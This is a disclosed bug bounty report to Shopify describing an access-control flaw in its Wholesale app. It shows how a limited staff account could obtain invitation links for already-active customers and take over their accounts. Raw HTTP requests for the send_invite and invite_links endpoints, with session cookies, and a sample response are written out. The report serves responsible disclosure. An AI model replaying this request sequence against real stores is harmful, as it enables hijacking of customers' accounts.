# Staff who only have apps and channels permission can do a takeover account at the wholesale store (Bypass get invitation link)

## Report Details
- **Report ID**: 1266828
- **URL**: https://hackerone.com/reports/1266828
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-07-17T14:22:58.909Z
- **Disclosed**: 2021-11-21T14:59:37.507Z

## Reporter
- **Username**: urfavenemy01
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
When we invite customers at the wholesale store there is a feature to "Send invite" and "Get invite link" the get invite link feature displays the customner invitation link and can only be used once, but when the customer has accepted the invitation and actived their account already have access to wholesale store then these 2 features will not be able to be used again, this works as it should and the invitation link itself can be used to change the customer's account password, maybe this is why the "Get invite link" feature cannot be used again when the customer has activated his account because to avoid takeover accounts, but here I found a vulnerability to bypass getting an activated account customer invite link so that staff who only have Wholesale permission can get an invitation link even though the customer has activated his account which causes the takeover account

Step to reproduce :

I tested with Shopify plus partner sandbox store

1.  Login to the store using the account staff who only has permission to wholesale
2.  At wholesale customers, customers whose accounts are already active will have the status of Enable

{F1380035}

3.  Here you will not be able to use the Send invite and Get invite link features, and if you use these features you will get an error

Error when using the send invite feature :

{F1380038}

Error when using the Get invite link feature :

{F1380040}

Here we cannot get a Get invite link, but in this vulnerability we can get a Get invite link for the customer account that has been activated

4.  Here we do 2 post requests using burpsuite,

Requests :

```
POST /admin/shops/19596/accounts/{ID ACCOUNT}/send_invite HTTP/2
Host: wholesale.shopifyapps.com
Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _ga=GA1.2.tHExgAAT11NXuhaT9YUE8g%253D%253D; _session_id=fc5f618342a1e6b09a1b0dd8f663c815; shopify_domain=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkluTmpjbWx3ZEMxemNtTXRhSFIwY0hNdGFIbGtjbUY0WVc1dmJpMTRjM010YUhRdGMyTnlhWEIwTG0xNWMyaHZjR2xtZVM1amIyMGkiLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5zaG9waWZ5X2RvbWFpbiJ9fQ%3D%3D--0638dd0f382c4106ac4bc036aef29aff573e7e4f; _gid=GA1.2.1173666896.1626524371; _s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _shopify_s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _gat=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182518?hmac=adf5598e786b95e73d4c6637a457ea38a01f7fb99a14b480c7fbe9c22e53ef80&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529478
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Origin: https://wholesale.shopifyapps.com
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

authenticity_token=qHWmHVuCLbQOWT2cCElOvv%2BAQoHz4AvsMdVzW8zkjiTemE5jx2q7IdeX9nfSnVHA45fbdXVx4oo%2FYhU%2FpnnW8Q%3D%3D
```
Change {ID ACCOUNT} with victim id account

5. After making the request now do this request

Request :

```
POST /admin/shops/19596/accounts/{ID ACCOUNT} /invite_links HTTP/2
Host: wholesale.shopifyapps.com
Cookie: _y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _shopify_y=89dc5b45-EA1A-44DA-7630-F0F7AA8DFC4A; _ga=GA1.2.tHExgAAT11NXuhaT9YUE8g%253D%253D; _session_id=fc5f618342a1e6b09a1b0dd8f663c815; shopify_domain=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkluTmpjbWx3ZEMxemNtTXRhSFIwY0hNdGFIbGtjbUY0WVc1dmJpMTRjM010YUhRdGMyTnlhWEIwTG0xNWMyaHZjR2xtZVM1amIyMGkiLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5zaG9waWZ5X2RvbWFpbiJ9fQ%3D%3D--0638dd0f382c4106ac4bc036aef29aff573e7e4f; _gid=GA1.2.1173666896.1626524371; _s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _shopify_s=b49fbdf4-ACD4-4EC3-2C95-5B9FC0AB0372; _gat=1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://wholesale.shopifyapps.com/admin/shops/19596/accounts/5182510?hmac=a916ff51bbbb7f51d6ac927131c0b28b08f54458a1062284fdbabd823d43c2f1&host=c2NyaXB0LXNyYy1odHRwcy1oeWRyYXhhbm9uLXhzcy1odC1zY3JpcHQubXlzaG9waWZ5LmNvbS9hZG1pbg&locale=en-US&session=6200a0935dc41a7c47776049d06e4b7f513d5b4622342e2851aeb5fc8f2f9f75&shop=script-src-https-hydraxanon-xss-ht-script.myshopify.com&timestamp=1626529537
X-Csrf-Token: 8TESa0/8klTiTrM0zMpVyEmoGvady47gKvvExY9jFYuH3PoV0xQEwTuAeN8WHkq2Vb+DAhtaZ4YkTKKh5f5NXg==
X-Requested-With: XMLHttpRequest
Origin: https://wholesale.shopifyapps.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0
Te: trailers
Connection: close
```
Change {ID ACCOUNT} with victim id account

Response :

```
HTTP/2 201 Created
Date: Sat, 17 Jul 2021 13:46:27 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 158
Cache-Control: max-age=0, private, must-revalidate
Etag: W/"0e9053914b08296f0e7fae495a23ad27"
P3p: CP="Not used"
Referrer-Policy: origin-when-cross-origin
Server-Timing: processing;dur=97, socket_queue;dur=2, edge;dur=2
Set-Cookie: request_method=POST; path=/; Secure; SameSite=None
Set-Cookie: _session_id=fc5f618342a1e6b09a1b0dd8f663c815; path=/; expires=Sat, 17 Jul 2021 19:46:27 GMT; secure; HttpOnly; SameSite=None
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Dc: gcp-us-east1,gke
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 7bf36731f52e3e6d0aec56924968b37c
X-Robots-Tag: noindex,nofollow
X-Runtime: 0.096325
X-Xss-Protection: 1; mode=block

{"invite_link":"https://script-src-https-hydraxanon-xss-ht-script.wholesale.shopifyapps.com/accounts/invitation/accept?invitation_token=█████"}
```


Here we succes to get an invite link belonging to an active account and now we can do an account takeover

## Impact

Vulnerability that allows attackers to get invite links  active accounts that can cause account takeovers

## Attachments
- Screenshot_2021-07-17_at_21-07-21_Shopify_Plus.png
- Screenshot_2021-07-17_at_21-09-29_Shopify_Plus.png
- Screenshot_2021-07-17_at_21-10-37_Shopify_Plus.png
